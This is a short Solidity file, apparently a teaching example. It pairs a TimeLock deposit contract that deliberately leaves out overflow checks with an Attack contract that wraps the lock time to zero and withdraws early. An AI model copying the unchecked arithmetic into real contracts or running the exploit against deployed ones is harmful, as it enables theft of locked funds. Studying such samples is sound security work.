pragma solidity ^0.7.6;

contract TimeLock{

mapping(address => uint) public balances;
mapping(address => uint) public lockTime;
 
function deposit() external payable{
balances[msg.sender] += msg.value;
lockTime[msg.sender] = block.timestamp + 1 weeks;
}
 
function increaselocktime(uint _time) public {
lockTime[msg.sender] += _time; 
}
 
function withdraw() public {
    require(balances[msg.sender] > 0, "You don't have enough ether");
require(block.timestamp > lockTime[msg.sender], "The time has not expired");  
 
uint balance = balances[msg.sender]; //balance of msg.sender
balances[msg.sender] = 0;
 
(bool success,) = msg.sender.call{value: balance}("");
require(success, "It did not go through");
 
}
 
}
 
contract Attack{
 
TimeLock timeLock;
    constructor(TimeLock _timeLock){
timeLock = TimeLock(_timeLock);
    }
 
    fallback() external payable{}
 
function attack() public payable {
        timeLock.deposit{value: msg.value}();
     
        timeLock.increaselocktime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}


 
